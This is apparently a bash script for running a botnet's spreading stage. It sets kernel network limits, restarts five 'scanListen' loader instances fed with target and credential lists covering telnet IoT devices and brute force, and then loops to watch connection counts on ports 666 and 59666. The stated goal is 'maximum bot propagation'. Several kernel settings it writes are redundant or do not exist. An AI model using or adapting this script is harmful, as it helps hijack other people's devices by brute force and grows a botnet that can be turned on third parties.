#!/bin/bash

# Comprehensive scanListen optimization script
echo "=== Optimizing scanListen for maximum bot propagation ==="

# System optimizations
echo "Applying system optimizations..."
ulimit -n 999999
echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse
echo 1 > /proc/sys/net/ipv4/tcp_fin_timeout
echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout
echo 1 > /proc/sys/net/ipv4/tcp_tw_recycle
echo 65536 > /proc/sys/net/core/somaxconn
echo 65536 > /proc/sys/net/core/netdev_max_backlog
echo 1 > /proc/sys/net/ipv4/tcp_no_delay_ack
echo 1 > /proc/sys/net/ipv4/tcp_low_latency

# Kill existing processes
echo "Stopping existing scanListen processes..."
pkill -f scanListen
sleep 2

# Start optimized scanListen instances
echo "Starting optimized scanListen instances..."

# Instance 1: High-performance scanning
echo "Starting high-performance instance..."
./scanListen loader1 < big.txt &
SCAN1_PID=$!

# Instance 2: IoT device focus
echo "Starting IoT-focused instance..."
./scanListen loader2 < telnet.txt &
SCAN2_PID=$!

# Instance 3: Brute force attacks
echo "Starting brute force instance..."
./scanListen loader3 < brute.txt &
SCAN3_PID=$!

# Instance 4: Enhanced targets
echo "Starting enhanced targets instance..."
./scanListen loader4 < enhanced_targets.txt &
SCAN4_PID=$!

# Instance 5: Extended list
echo "Starting extended list instance..."
./scanListen loader5 < list.txt &
SCAN5_PID=$!

echo "=== ScanListen Optimization Complete ==="
echo "Instance 1 (High Performance): PID $SCAN1_PID"
echo "Instance 2 (IoT Focus): PID $SCAN2_PID"
echo "Instance 3 (Brute Force): PID $SCAN3_PID"
echo "Instance 4 (Enhanced Targets): PID $SCAN4_PID"
echo "Instance 5 (Extended List): PID $SCAN5_PID"

# Monitor performance
echo "Starting performance monitoring..."
while true; do
    sleep 60
    echo "=== Performance Report ==="
    echo "Active scanListen processes:"
    ps aux | grep scanListen | grep -v grep | wc -l
    echo "Total connections:"
    ss -tn | grep -E "(666|59666)" | wc -l
    echo "Memory usage:"
    ps aux | grep scanListen | grep -v grep | awk '{sum+=$6} END {print "Total RSS: " sum " KB"}'
    echo "========================"
done
